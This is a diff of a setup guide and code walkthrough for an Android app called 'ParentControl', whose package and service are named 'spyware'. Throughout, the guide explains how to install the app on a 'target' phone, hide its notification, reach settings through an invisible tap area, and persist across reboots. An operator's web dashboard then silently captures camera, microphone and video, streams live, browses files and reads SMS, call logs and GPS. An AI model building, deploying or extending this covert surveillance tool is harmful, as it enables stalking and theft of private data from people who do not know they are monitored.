@@ -1,6 +1,6 @@
 # 🛠️ Complete Setup Guide — WebRTC Android ParentControl v2.0
 
-> **Architecture**: Android App (Kotlin) ↔ Node.js Backend (Render) ↔ PHP Dashboard (your PHP host)
+> **Architecture**: Android App (Kotlin) ↔ Node.js Backend (Render) ↔ PHP Dashboard (your PHP host + MySQL)
 
 ---
 
@@ -11,8 +11,8 @@
 | PHP Host | Any shared hosting / VPS / cPanel with PHP 7.4+, MySQL 5.7+ |
 | Node.js Server | Render.com free tier (or any VPS with Node 18+) |
 | Android Device | Android 9+ (API 28+), Camera + Mic permissions |
-| Browser | Chrome 80+ / Firefox 75+ / Edge 80+ |
-| Android Studio | Arctic Fox+ (for building APK) |
+| Browser | Chrome 80+ / Firefox 75+ / Edge 80+ / Safari 13+ |
+| Android Studio | Arctic Fox+ |
 | npm | v8+ |
 
 ---
@@ -20,9 +20,9 @@
 ## 🏗️ Full Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                     SYSTEM ARCHITECTURE                         │
-└─────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────┐
+│                     SYSTEM ARCHITECTURE                          │
+└──────────────────────────────────────────────────────────────────┘
 
   📱 Android Device                    🖥️ Admin Browser
   ┌─────────────────┐                 ┌─────────────────┐
@@ -35,36 +35,32 @@
   │                 │      │          │  ↕ Socket.IO    │
   │ WebRTC          │      │          │  ↕ WebRTC       │
   │ PeerConnection  │      │          └────────┬────────┘
-  └─────────────────┘      │                   │
-         │                 └───────────────────┘
+  └─────────────────┘      │                  │
+         │                 └──────────────────┘
          │                         ▲
          ▼                         │
-  ┌─────────────────────────────────────────────────────┐
+  ┌──────────────────────────────────────────────────────┐
   │           Node.js Backend (Render.com)               │
   │           node-backend/server.js                     │
   │                                                      │
-  │  • Device registration (register-device)            │
-  │  • Controller join (join-as-controller)             │
-  │  • WebRTC signaling (offer/answer/ice-candidate)    │
-  │  • Capture commands relay (capture-image/audio/video)│
-  │  • Media base64 forwarding (media-captured → media-ready)│
-  │  • Auto-reconnect (pingTimeout: 60s, pingInterval: 25s) │
-  │  • GET /health → { status: 'ok' } for Render        │
-  └─────────────────────────────────────────────────────┘
+  │  • Device registration (register-device)             │
+  │  • Controller join (join-as-controller)              │
+  │  • WebRTC signaling (offer/answer/ice-candidate)     │
+  │  • Capture commands relay (image/audio/video)        │
+  │  • Media base64 forwarding (media-captured→ready)    │
+  │  • GET /health → { status: 'ok' } for Render         │
+  └──────────────────────────────────────────────────────┘
          │
-         ▼ (base64 media upload via fetch)
-  ┌─────────────────────────────────────────────────────┐
+         ▼ (base64 media upload via fetch POST)
+  ┌──────────────────────────────────────────────────────┐
   │           PHP Dashboard + MySQL                      │
-  │           php-dashboard/                             │
-  │                                                      │
-  │  • install.php  → one-click DB + admin setup        │
-  │  • login.php    → bcrypt auth                       │
-  │  • index.php    → dashboard UI + WebRTC viewer      │
-  │  • upload_media.php → save base64 media to uploads/ │
-  │  • delete_media.php → remove files + DB rows        │
-  │  • MySQL: admins, devices, media_captures tables    │
-  │  • Auto-delete media after 24 hours                 │
-  └─────────────────────────────────────────────────────┘
+  │  install.php → one-click DB + admin setup            │
+  │  login.php   → bcrypt auth                           │
+  │  index.php   → dashboard UI + WebRTC viewer          │
+  │  upload_media.php → save media to uploads/           │
+  │  MySQL: admins, devices, media_captures tables       │
+  │  Auto-delete media after 24 hours                    │
+  └──────────────────────────────────────────────────────┘
 ```
 
 ---
@@ -80,10 +76,10 @@ cd WebRTC-Android-prentcontrol
 
 ---
 
-### Step 2 — Deploy Node.js Backend on Render
+### Step 2 — Deploy Node.js Server on Render
 
 1. Go to [render.com](https://render.com) → **New Web Service**
-2. Connect your GitHub repo: `david0154/WebRTC-Android-prentcontrol`
+2. Connect your GitHub repo
 3. Set these settings:
 
 | Setting | Value |
@@ -95,20 +91,20 @@ cd WebRTC-Android-prentcontrol
 | Health Check Path | `/health` |
 | Plan | Free |
 
-4. Click **Create Web Service**
-5. Wait for deploy → copy your URL: `https://YOUR-APP.onrender.com`
+4. Click **Create Web Service** → wait for deploy
+5. Copy your Render URL: `https://YOUR-APP.onrender.com`
 
-> ⚠️ **Render Free Tier**: Server sleeps after 15 min inactivity. Android app auto-reconnects when it wakes.
+> ⚠️ **Render Free Tier**: Server sleeps after 15 min inactivity. Android SocketManager has infinite auto-reconnect to handle wake-up.
 
-> ✅ **`/` endpoint returns JSON only** — no web dashboard opens on Render URL.
+> ✅ **`/` endpoint returns JSON only** — no web dashboard at Render URL. Dashboard is on your PHP host.
 
 ---
 
 ### Step 3 — Setup PHP Dashboard (One-Click Install)
 
-1. Upload the entire `php-dashboard/` folder to your PHP web host root (via FTP/cPanel)
+1. Upload the entire `php-dashboard/` folder to your PHP web host (FTP/cPanel)
 2. Open in browser: `https://your-domain.com/install.php`
-3. Fill in the form:
+3. Fill in the installer form:
 
 | Field | Example |
 |---|---|
@@ -120,26 +116,36 @@ cd WebRTC-Android-prentcontrol
 | Admin Password | `StrongPass123!` |
 | Node.js Backend URL | `https://YOUR-APP.onrender.com` |
 
-4. Click **Install Now** — tables auto-created, `config.php` written
+4. Click **Install Now** — database + tables auto-created, `config.php` written
 5. ⚠️ **Delete `install.php`** immediately after successful install
-6. Visit `https://your-domain.com/login.php` → login with admin credentials
+6. Visit `https://your-domain.com/login.php` → login → Dashboard ready
 
 ---
 
-### Step 4 — Build Android App
+### Step 4 — Configure Android App
 
 1. Open project root in **Android Studio**
 2. Open `app/src/main/java/com/webrtc/spyware/SpywareService.kt`
-3. Replace the server URL:
+3. Set your Render URL:
 ```kotlin
-// Line ~17
-private val SERVER_URL = "https://YOUR-APP.onrender.com"
-// ↑ Replace with your actual Render URL
+// Replace this line:
+private val SERVER_URL = "https://YOUR-RENDER-APP.onrender.com"
 ```
 
-4. Open `app/src/main/AndroidManifest.xml` and add all entries from `AndroidManifest_additions.xml`:
+4. Configure TURN server credentials (optional, for cross-network):
+```kotlin
+ice.add(
+    PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
+        .setUsername("your-actual-username")   // 🔑 Replace
+        .setPassword("your-actual-password")   // 🔑 Replace
+        .createIceServer()
+)
+```
+
+5. Open `app/src/main/AndroidManifest.xml` and merge all entries from `AndroidManifest_additions.xml`:
+
 ```xml
-<!-- Permissions (add inside <manifest>) -->
+<!-- Add inside <manifest> -->
 <uses-permission android:name="android.permission.CAMERA" />
 <uses-permission android:name="android.permission.RECORD_AUDIO" />
 <uses-permission android:name="android.permission.INTERNET" />
@@ -148,8 +154,14 @@ private val SERVER_URL = "https://YOUR-APP.onrender.com"
 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
 <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 <uses-permission android:name="android.permission.WAKE_LOCK" />
+<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+<uses-permission android:name="android.permission.READ_SMS" />
+<uses-permission android:name="android.permission.READ_CALL_LOG" />
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
 
-<!-- Components (add inside <application>) -->
+<!-- Add inside <application> -->
 <service
     android:name=".SpywareService"
     android:exported="false"
@@ -164,35 +176,45 @@ private val SERVER_URL = "https://YOUR-APP.onrender.com"
 </receiver>
 ```
 
-5. Sync Gradle → **Build → Generate Signed APK** (or run on device directly)
-6. Install on target Android device
-7. Grant all permissions when prompted:
-   - 📷 Camera
-   - 🎤 Microphone
-   - 📡 Internet
-   - 🔔 Notifications
+6. **Sync Gradle** → **Build → Generate Signed APK**
+7. Install APK on target Android device
+8. Open app → tap **top-right invisible area** → open Streaming Settings
+9. Verify server URL is correct → toggle streaming ON
+10. Grant all permissions:
+    - 📷 Camera | 🎤 Microphone | 📍 Location (Fine)
+    - 💬 SMS | 📞 Call Log | 🔔 Notifications
+    - 💾 Manage External Storage (Android 11+ for File Explorer)
 
 ---
 
-### Step 5 — Verify Everything Works
+### Step 5 — Launch & Verify
 
-1. Install APK on Android device
-2. Open PHP dashboard → `login.php` → login
-3. Within a few seconds, device should appear in **Connected Devices**
-4. Click **▶ Live View** to start WebRTC stream
-5. Click **📷 Photo**, **🎤 Audio**, or **🎬 Video** to test capture
+```bash
+# Expected output when Node.js starts:
+# ✅ WebRTC Signaling Server Running
+# 🔌 Socket.IO initialized and ready
+# Server listening on port 3000
+```
+
+1. Open PHP dashboard → `https://your-domain.com/login.php`
+2. Login with admin credentials
+3. Within a few seconds device appears in **Connected Devices** section
+4. Click **▶ Live View** → camera stream appears
+5. Click **📷 Photo** / **🎤 Audio** / **🎬 Video** → media captured remotely
+6. Click **📂 Files** → browse device storage
+7. Check **SMS**, **Calls**, **GPS** tabs for live data
+
+> 💡 **Pro Tip**: Keep the Android app in the foreground initially. Once all streams initialize, you can minimize it.
 
 ---
 
-## 📁 Complete Codebase Deep Dive
+## 📖 Complete Codebase Deep Dive
 
 ---
 
 ### 🤖 Android — Kotlin Source Files
 
-#### `app/src/main/java/com/webrtc/spyware/SpywareService.kt`
-
-The **main entry point** of the Android side. Runs as a persistent foreground service.
+#### `SpywareService.kt` — Main Foreground Service
 
 ```
 SpywareService (extends Service)
@@ -201,140 +223,125 @@ SpywareService (extends Service)
 │   ├── createNotificationChannel()     → silent notification (IMPORTANCE_MIN)
 │   ├── startForeground(1, notification) → keeps process alive
 │   ├── reads ANDROID_ID                → unique device identifier
-│   ├── creates SocketManager(serverUrl, deviceId, callback)
+│   ├── creates SocketManager(url, deviceId, callback)
 │   ├── creates MediaCaptureManager(context, socketManager)
-│   └── socketManager.connect()         → initiates Socket.IO connection
+│   └── socketManager.connect()         → initiates Socket.IO
 │
 ├── handleCaptureCommand(type, params)
-│   ├── "image" → mediaCaptureManager.captureImage(useFront)
-│   ├── "audio" → mediaCaptureManager.captureAudio(duration)
-│   ├── "video" → mediaCaptureManager.captureVideo(duration, useFront)
-│   └── "start-stream" → logs (handled in Activity for WebRTC)
+│   ├── "image"  → mediaCaptureManager.captureImage(useFront)
+│   ├── "audio"  → mediaCaptureManager.captureAudio(duration)
+│   ├── "video"  → mediaCaptureManager.captureVideo(duration, useFront)
+│   └── "start-stream" → trigger WebRTC offer in Activity
 │
 ├── onStartCommand() → returns START_STICKY (auto-restart if killed)
-└── onDestroy()      → releases mediaCaptureManager + socketManager
+└── onDestroy()      → release mediaCaptureManager + socketManager
 ```
-
-**Key design**: `START_STICKY` ensures Android restarts the service if system kills it. Notification channel uses `IMPORTANCE_MIN` to hide from status bar.
 
 ---
 
-#### `app/src/main/java/com/webrtc/spyware/SocketManager.kt`
-
-Wraps the **Socket.IO client** with auto-reconnect and command dispatching.
+#### `SocketManager.kt` — Socket.IO Client
 
 ```
 SocketManager
 │
 ├── connect()
 │   ├── IO.Options: reconnection=true, delay=2s, maxDelay=10s, attempts=∞
-│   ├── socket.on(EVENT_CONNECT)        → emits "register-device" with deviceId
-│   ├── socket.on(EVENT_DISCONNECT)     → logs, isConnected=false
-│   ├── socket.on(EVENT_CONNECT_ERROR)  → logs error
-│   ├── socket.on("capture-image")      → calls onCaptureCommand("image", params)
-│   ├── socket.on("capture-audio")      → calls onCaptureCommand("audio", params)
-│   ├── socket.on("capture-video")      → calls onCaptureCommand("video", params)
-│   └── socket.on("start-stream")       → calls onCaptureCommand("start-stream", {})
+│   ├── on(EVENT_CONNECT)        → emits "register-device" { deviceId }
+│   ├── on(EVENT_DISCONNECT)     → logs, isConnected=false
+│   ├── on("capture-image")      → onCaptureCommand("image", params)
+│   ├── on("capture-audio")      → onCaptureCommand("audio", params)
+│   ├── on("capture-video")      → onCaptureCommand("video", params)
+│   └── on("start-stream")       → onCaptureCommand("start-stream", {})
 │
 ├── sendMediaCapture(base64, type, filename, mimeType)
 │   └── emits "media-captured" → { deviceId, type, base64, filename, mimeType }
 │
-├── emitSignaling(event, data)          → forward WebRTC SDP/ICE
-└── disconnect()                        → clean shutdown
+├── emitSignaling(event, data)   → forward WebRTC SDP/ICE
+└── disconnect()                 → clean shutdown
 ```
 
-**Auto-reconnect logic**: `reconnectionAttempts = Int.MAX_VALUE` with exponential backoff from 2s → 10s max. The Node.js server has `pingTimeout: 60000` and `pingInterval: 25000` matching the client.
+**Auto-reconnect**: `reconnectionAttempts = Int.MAX_VALUE` with 2s→10s exponential backoff. Server uses `pingTimeout: 60000` / `pingInterval: 25000`.
 
 ---
 
-#### `app/src/main/java/com/webrtc/spyware/MediaCaptureManager.kt`
-
-Handles **silent camera2 + MediaRecorder** captures on a dedicated background thread.
+#### `MediaCaptureManager.kt` — Silent Capture
 
 ```
 MediaCaptureManager
 │
 ├── captureImage(useFront: Boolean)
-│   ├── getFacingCamera(LENS_FACING_FRONT / BACK)  → gets camera ID
+│   ├── getFacingCamera(LENS_FACING_FRONT / BACK)
 │   ├── ImageReader(1280×720, JPEG, maxImages=1)
-│   ├── openCamera → createCaptureSession → TEMPLATE_STILL_CAPTURE
-│   ├── onImageAvailable: reads buffer → Base64.encode → sendMediaCapture()
-│   └── File auto-freed (stays in ImageReader buffer, not disk)
+│   ├── Camera2: openCamera → createCaptureSession → TEMPLATE_STILL_CAPTURE
+│   └── onImageAvailable: buffer → Base64.encode → sendMediaCapture()
 │
 ├── captureAudio(durationSeconds: Int = 10)
 │   ├── MediaRecorder: MIC → MPEG_4 → AAC @ 128kbps / 44.1kHz
 │   ├── setMaxDuration(seconds × 1000)
-│   ├── setOnInfoListener: MAX_DURATION_REACHED → stop() → sendFile()
-│   └── File saved to context.cacheDir, deleted after upload
+│   └── MAX_DURATION_REACHED → stop() → sendFile() → file.delete()
 │
 ├── captureVideo(durationSeconds: Int = 15, useFront: Boolean)
 │   ├── MediaRecorder: SURFACE + MIC → MPEG_4 → H264 + AAC
 │   ├── 1280×720 @ 30fps, 3Mbps bitrate
-│   ├── openCamera(Camera2) → createCaptureSession → TEMPLATE_RECORD
-│   ├── session.setRepeatingRequest → mediaRecorder.start()
-│   └── MAX_DURATION_REACHED → stop() → sendFile() → file.delete()
+│   ├── Camera2 → TEMPLATE_RECORD → setRepeatingRequest
+│   └── mediaRecorder.start() → MAX_DURATION_REACHED → sendFile()
 │
-├── sendFile(file, type, mime)   → readBytes → Base64 → socketManager.sendMediaCapture()
-├── getFacingCamera(facing)      → filters cameraIdList by LENS_FACING characteristic
-└── release()                   → mediaRecorder.release(), cameraDevice.close(), bgThread.quitSafely()
+├── sendFile(file, type, mime)  → readBytes → Base64 → socketManager.sendMediaCapture()
+├── getFacingCamera(facing)     → filters cameraIdList by LENS_FACING
+└── release()                  → stop recorder, close camera, quit thread
 ```
 
-**Background thread**: `HandlerThread("CaptureThread")` + `Handler(bgThread.looper)` — all Camera2 callbacks run off the main thread to avoid ANR.
+**Background thread**: `HandlerThread("CaptureThread")` + `Handler(bgThread.looper)` — all Camera2 callbacks off main thread.
 
 ---
 
-#### `app/src/main/java/com/webrtc/spyware/BootReceiver.kt`
+#### `BootReceiver.kt` — Auto-Start on Boot
 
-BroadcastReceiver for `ACTION_BOOT_COMPLETED` — calls `startForegroundService(SpywareService)` on Android O+ or `startService()` on older versions.
+Listens for `ACTION_BOOT_COMPLETED` → calls `startForegroundService(SpywareService)` on Android O+ or `startService()` on older.
 
 ---
 
 ### 🟢 Node.js Backend — `node-backend/server.js`
 
-Pure **Socket.IO signaling server** — no web UI, no static files.
+Pure Socket.IO signaling server — no web UI, no static file serving.
 
 ```
 server.js
 │
-├── Express app + HTTP server + Socket.IO
-│   ├── GET /         → { status: 'ok' }   (no dashboard, just JSON)
-│   └── GET /health   → { status: 'ok', connections: N }
+├── GET /        → { status: 'ok' }   (JSON only, no dashboard)
+├── GET /health  → { status: 'ok', connections: N }
 │
 ├── State
-│   ├── rooms{}        → socket.id → { type, deviceId }
-│   └── deviceSockets{}→ deviceId → socket.id
+│   ├── rooms{}         → socket.id → { type, deviceId }
+│   └── deviceSockets{} → deviceId → socket.id
 │
-├── io.on("connection", socket)
-│   ├── "register-device" (from Android)
-│   │   ├── stores deviceSockets[deviceId] = socket.id
-│   │   ├── socket.join(`device_${deviceId}`)
-│   │   └── io.emit("device-list-update", allDeviceIds)
-│   │
-│   ├── "join-as-controller" (from Dashboard)
-│   │   ├── socket.join(`ctrl_${deviceId}`)
-│   │   └── io.to(`device_${deviceId}`).emit("start-stream")
-│   │
-│   ├── WebRTC Signaling
-│   │   ├── "offer"          → io.to(data.to).emit("offer", { sdp, from })
-│   │   ├── "answer"         → io.to(data.to).emit("answer", { sdp, from })
-│   │   └── "ice-candidate"  → io.to(data.to).emit("ice-candidate", { candidate, from })
-│   │
-│   ├── Capture Commands (from Dashboard → Device)
-│   │   ├── "capture-image" → io.to(`device_${deviceId}`).emit("capture-image", { camera })
-│   │   ├── "capture-audio" → io.to(`device_${deviceId}`).emit("capture-audio", { duration })
-│   │   └── "capture-video" → io.to(`device_${deviceId}`).emit("capture-video", { duration, camera })
-│   │
-│   ├── "media-captured" (from Android)
-│   │   └── io.to(`ctrl_${deviceId}`).emit("media-ready", data)
-│   │
-│   └── "disconnect"
-│       ├── removes from deviceSockets{}
-│       └── io.emit("device-list-update", remaining)
-│
-└── server.listen(PORT || 3000)
+└── io.on("connection", socket)
+    ├── "register-device"     (Android)
+    │   ├── deviceSockets[deviceId] = socket.id
+    │   ├── socket.join(`device_${deviceId}`)
+    │   └── io.emit("device-list-update", allDeviceIds)
+    │
+    ├── "join-as-controller"  (Dashboard)
+    │   ├── socket.join(`ctrl_${deviceId}`)
+    │   └── io.to(`device_${deviceId}`).emit("start-stream")
+    │
+    ├── WebRTC Signaling
+    │   ├── "offer"          → io.to(data.to).emit("offer", { sdp, from })
+    │   ├── "answer"         → io.to(data.to).emit("answer", { sdp, from })
+    │   └── "ice-candidate"  → io.to(data.to).emit("ice-candidate", { candidate, from })
+    │
+    ├── Capture Commands (Dashboard → Device)
+    │   ├── "capture-image" → io.to(`device_${id}`).emit("capture-image", { camera })
+    │   ├── "capture-audio" → io.to(`device_${id}`).emit("capture-audio", { duration })
+    │   └── "capture-video" → io.to(`device_${id}`).emit("capture-video", { duration, camera })
+    │
+    ├── "media-captured"      (Android → Dashboard relay)
+    │   └── io.to(`ctrl_${deviceId}`).emit("media-ready", data)
+    │
+    └── "disconnect"
+        ├── remove from deviceSockets{}
+        └── io.emit("device-list-update", remaining)
 ```
-
-**Anti-connection-loss**: `pingTimeout: 60000`, `pingInterval: 25000`. Room-based isolation ensures a dashboard controller only receives events from its targeted device.
 
 ---
 
@@ -343,124 +350,74 @@ server.js
 #### `install.php` — One-Click Installer
 
 ```
-install.php (POST handler)
-│
-├── Connects to MySQL with provided credentials
+POST handler:
+├── PDO connect to MySQL
 ├── CREATE DATABASE IF NOT EXISTS `parentcontrol`
 ├── CREATE TABLE admins    (id, username UNIQUE, password bcrypt, created_at)
-├── CREATE TABLE devices   (id, device_id UNIQUE, device_name, last_seen, created_at)
+├── CREATE TABLE devices   (id, device_id UNIQUE, device_name, last_seen)
 ├── CREATE TABLE media_captures
-│   (id, device_id, media_type ENUM(image/audio/video),
-│    filename, file_path, file_size, captured_at, expires_at)
-│   INDEX on: device_id, media_type, captured_at
-├── INSERT admin user with password_hash(pass, PASSWORD_BCRYPT)
-├── Writes config.php with all constants
+│   (id, device_id, media_type ENUM, filename, file_path, file_size,
+│    captured_at, expires_at | INDEX on device_id, media_type, captured_at)
+├── INSERT admin: password_hash(pass, PASSWORD_BCRYPT)
+├── Write config.php with all constants
 └── mkdir uploads/ + uploads/.htaccess (Options -Indexes)
 ```
-
----
-
-#### `config.php` — Auto-Generated Config
-
-```php
-define('DB_HOST',   'localhost');
-define('DB_NAME',   'parentcontrol');
-define('DB_USER',   'user');
-define('DB_PASS',   'pass');
-define('NODE_BACKEND_URL',      'https://your-app.onrender.com');
-define('MEDIA_UPLOAD_DIR',      __DIR__ . '/uploads/');
-define('MEDIA_TEMP_EXPIRY_HOURS', 24);  // auto-delete after 24h
-session_start();                        // all pages share session
-```
-
----
 
 #### `login.php` — Authentication
 
 ```
-login.php
-├── GET  → shows login form (dark themed)
-├── POST → PDO query: SELECT * FROM admins WHERE username = ?
-│          password_verify(input, stored_hash)
-│          if match → $_SESSION['admin_id'] + ['admin_user']
-│                   → redirect index.php
-│          else     → show error message
-└── If already logged in → redirect index.php
+├── GET  → show login form
+└── POST → PDO SELECT admins WHERE username=?
+           password_verify(input, hash)
+           match → $_SESSION['admin_id'] → redirect index.php
+           fail  → show error
 ```
-
----
 
 #### `index.php` — Main Dashboard
 
 ```
-index.php
-│
-├── Auth check: !$_SESSION['admin_id'] → redirect login.php
-├── PDO connect to MySQL
+├── Auth check → redirect login.php if not logged in
 ├── Auto-cleanup: DELETE FROM media_captures WHERE expires_at < NOW()
-├── Stats queries: COUNT devices, images, audios, videos
-├── Fetch: device_list (last 50 by last_seen DESC)
-├── Fetch: recent_media (last 30 by captured_at DESC)
+├── Stats: COUNT devices, images, audios, videos
+├── Fetch: device_list (50 by last_seen DESC)
+├── Fetch: recent_media (30 by captured_at DESC)
 │
-├── HTML Dashboard
-│   ├── Stats bar (4 tiles: devices / images / audios / videos)
+├── HTML
+│   ├── Stats tiles (4: devices / images / audios / videos)
 │   ├── Device Cards grid
 │   │   ├── [▶ Live View]  → startLive(deviceId)
 │   │   ├── [📷 Photo]     → captureImage(deviceId)
 │   │   ├── [🎤 Audio]     → captureAudio(deviceId)
 │   │   └── [🎬 Video]     → captureVideo(deviceId)
-│   ├── Live View section (hidden until startLive())
-│   │   └── <video id="remote-video" autoplay>
-│   └── Media Gallery grid
-│       ├── <img> for images
-│       ├── <audio controls> for audio
-│       ├── <video controls> for video
-│       └── Download ↓ + 🗑 Delete links per item
+│   ├── Live View section  → <video id="remote-video" autoplay>
+│   └── Media Gallery      → img/audio/video + download/delete
 │
 └── JavaScript (Socket.IO + WebRTC)
-    ├── io(NODE_URL, { reconnection: true, reconnectionDelay: 2000 })
-    ├── on("connect")           → update status bar ✅
-    ├── on("disconnect")        → update status bar 🔴
-    ├── on("device-list-update")→ highlight online devices (green border)
-    ├── startLive(deviceId)
-    │   ├── new RTCPeerConnection({ iceServers: [stun:stun.l.google.com] })
-    │   ├── ontrack → remote-video.srcObject = stream
-    │   └── socket.emit("join-as-controller", { deviceId })
-    ├── on("offer")             → setRemoteDesc → createAnswer → emit "answer"
-    ├── on("ice-candidate")     → addIceCandidate
-    ├── captureImage/Audio/Video → emit capture command via socket
-    ├── on("media-ready")       → b64toBlob → FormData → POST upload_media.php
-    └── b64toBlob(b64, mime)    → Uint8Array → Blob
+    ├── io(NODE_URL, { reconnection:true, reconnectionDelay:2000 })
+    ├── on("connect")            → status bar ✅
+    ├── on("disconnect")         → status bar 🔴
+    ├── on("device-list-update") → green border on online devices
+    ├── startLive(deviceId)      → new RTCPeerConnection(STUN)
+    │   ├── ontrack              → remote-video.srcObject = stream
+    │   └── emit "join-as-controller"
+    ├── on("offer")              → setRemoteDesc → createAnswer → emit "answer"
+    ├── on("ice-candidate")      → addIceCandidate
+    ├── captureImage/Audio/Video → emit command via socket
+    └── on("media-ready")        → b64toBlob → FormData → POST upload_media.php
 ```
-
----
 
 #### `upload_media.php` — Media Storage
 
 ```
-upload_media.php (POST)
-│
-├── Validates: device_id (sanitized), media_type (whitelist)
-├── Checks $_FILES['file']['tmp_name'] not empty
-├── Generates filename: {device_id}_{date}_{uniqid}.{ext}
+POST handler:
+├── Sanitize: device_id (regex), media_type (whitelist)
+├── Check $_FILES['file']['tmp_name']
+├── Filename: {device_id}_{date}_{uniqid}.{ext}
 ├── move_uploaded_file() to uploads/
-├── Calculates expires_at = NOW() + MEDIA_TEMP_EXPIRY_HOURS
-├── INSERT INTO media_captures (device_id, media_type, filename, file_path, file_size, expires_at)
+├── expires_at = NOW() + MEDIA_TEMP_EXPIRY_HOURS
+├── INSERT INTO media_captures
 ├── INSERT INTO devices ... ON DUPLICATE KEY UPDATE last_seen=NOW()
-└── Returns JSON { success: true, filename }
-```
-
----
-
-#### `delete_media.php` — Media Deletion
-
-```
-delete_media.php (GET ?id=N)
-├── Auth check
-├── SELECT file_path WHERE id=N
-├── unlink(file_path) if file exists
-├── DELETE FROM media_captures WHERE id=N
-└── redirect index.php
+└── return JSON { success: true, filename }
 ```
 
 ---
@@ -468,7 +425,7 @@ delete_media.php (GET ?id=N)
 ### 🗄️ Database Schema
 
 ```sql
--- Admin users (login credentials)
+-- Admin users
 CREATE TABLE admins (
     id         INT AUTO_INCREMENT PRIMARY KEY,
     username   VARCHAR(100) NOT NULL UNIQUE,
@@ -485,16 +442,16 @@ CREATE TABLE devices (
     created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
 );
 
--- Temporary media captures (auto-purged after 24h)
+-- Temporary media captures (auto-purged)
 CREATE TABLE media_captures (
-    id         INT AUTO_INCREMENT PRIMARY KEY,
-    device_id  VARCHAR(100) NOT NULL,
-    media_type ENUM('image','audio','video') NOT NULL,
-    filename   VARCHAR(300) NOT NULL,
-    file_path  VARCHAR(500) NOT NULL,
-    file_size  INT DEFAULT 0,
+    id          INT AUTO_INCREMENT PRIMARY KEY,
+    device_id   VARCHAR(100) NOT NULL,
+    media_type  ENUM('image','audio','video') NOT NULL,
+    filename    VARCHAR(300) NOT NULL,
+    file_path   VARCHAR(500) NOT NULL,
+    file_size   INT DEFAULT 0,
     captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-    expires_at  DATETIME DEFAULT NULL,
+    expires_at  DATETIME DEFAULT NULL,           -- NULL = never expires
     INDEX (device_id),
     INDEX (media_type),
     INDEX (captured_at)
@@ -503,74 +460,60 @@ CREATE TABLE media_captures (
 
 ---
 
-## 🔄 Full Data Flow — Media Capture
+## 🔄 Full Data Flows
+
+### 📸 Media Capture Flow
 
 ```
 1. Admin clicks [📷 Photo] in browser dashboard
       ↓
-2. index.php JS: socket.emit("capture-image", { deviceId: "abc123", camera: "front" })
+2. index.php JS: socket.emit("capture-image", { deviceId, camera: "front" })
       ↓
-3. Node.js server: receives "capture-image"
-      → io.to(`device_abc123`).emit("capture-image", { camera: "front" })
+3. Node.js: io.to(`device_${deviceId}`).emit("capture-image", { camera })
       ↓
-4. Android SocketManager.kt: receives "capture-image" event
-      → calls onCaptureCommand("image", { camera: "front" })
+4. Android SocketManager: receives "capture-image"
+      → onCaptureCommand("image", { camera: "front" })
       ↓
-5. SpywareService.kt: handleCaptureCommand("image", params)
-      → mediaCaptureManager.captureImage(useFront = true)
+5. SpywareService: mediaCaptureManager.captureImage(useFront=true)
       ↓
-6. MediaCaptureManager.kt: Camera2 API
-      → ImageReader(1280×720, JPEG)
-      → onImageAvailable: readBytes → Base64.encode
-      → socketManager.sendMediaCapture(b64, "image", "img_20260521_112800.jpg", "image/jpeg")
+6. MediaCaptureManager: Camera2 → ImageReader → onImageAvailable
+      → readBytes → Base64.encode
+      → socketManager.sendMediaCapture(b64, "image", filename, "image/jpeg")
       ↓
-7. Android: socket.emit("media-captured", { deviceId, type, base64, filename, mimeType })
+7. Android: socket.emit("media-captured", { deviceId, type, base64, filename })
       ↓
-8. Node.js: receives "media-captured"
-      → io.to(`ctrl_abc123`).emit("media-ready", data)
+8. Node.js: io.to(`ctrl_${deviceId}`).emit("media-ready", data)
       ↓
-9. Browser JS (index.php): receives "media-ready"
-      → b64toBlob(data.base64, "image/jpeg")
-      → FormData: file + device_id + media_type
-      → fetch("upload_media.php", { method: POST, body: formData })
+9. Browser JS: b64toBlob → FormData → fetch("upload_media.php", POST)
       ↓
-10. upload_media.php:
-       → move_uploaded_file() to uploads/
-       → INSERT INTO media_captures
-       → UPDATE devices last_seen
-       → returns { success: true }
+10. upload_media.php: move_uploaded_file → INSERT media_captures
       ↓
-11. Browser: location.reload() → image appears in gallery ✅
+11. location.reload() → image appears in gallery ✅
 ```
 
----
-
-## 🔄 Full Data Flow — WebRTC Live View
+### 📺 WebRTC Live View Flow
 
 ```
-1. Admin clicks [▶ Live View] for device "abc123"
+1. Admin clicks [▶ Live View]
       ↓
-2. Browser JS: new RTCPeerConnection(STUN config)
-      socket.emit("join-as-controller", { deviceId: "abc123" })
+2. Browser: new RTCPeerConnection(STUN)
+   socket.emit("join-as-controller", { deviceId })
       ↓
-3. Node.js: socket.join(`ctrl_abc123`)
-      → io.to(`device_abc123`).emit("start-stream")
+3. Node.js: socket.join(`ctrl_${deviceId}`)
+   → io.to(`device_${deviceId}`).emit("start-stream")
       ↓
-4. Android SocketManager: receives "start-stream"
-      → triggers WebRTC offer creation in Activity
-      (calls getUserMedia → createOffer → setLocalDescription)
-      socket.emit("offer", { to: controllerId, sdp: offer })
+4. Android: receives "start-stream"
+   → getUserMedia → createOffer → setLocalDescription
+   socket.emit("offer", { to: controllerId, sdp })
       ↓
-5. Node.js: io.to(controllerId).emit("offer", { sdp, from: deviceSocketId })
+5. Node.js: io.to(controllerId).emit("offer", { sdp, from })
       ↓
-6. Browser: setRemoteDescription(offer)
-      → createAnswer → setLocalDescription
-      socket.emit("answer", { to: from, sdp: answer })
+6. Browser: setRemoteDescription → createAnswer → setLocalDescription
+   socket.emit("answer", { to: from, sdp })
       ↓
 7. ICE candidates exchanged via Node.js relay
       ↓
-8. WebRTC P2P connection established
-      → ontrack: remote-video.srcObject = stream 📺
+8. WebRTC P2P established → ontrack: remote-video.srcObject = stream 📺
 ```
 
 ---
@@ -582,15 +525,16 @@ CREATE TABLE media_captures (
 cd node-backend
 npm install
 node server.js
-# Server at http://localhost:3000
+# → http://localhost:3000
 
-# 2. PHP dashboard — use XAMPP/Laragon
+# 2. PHP dashboard — XAMPP/Laragon
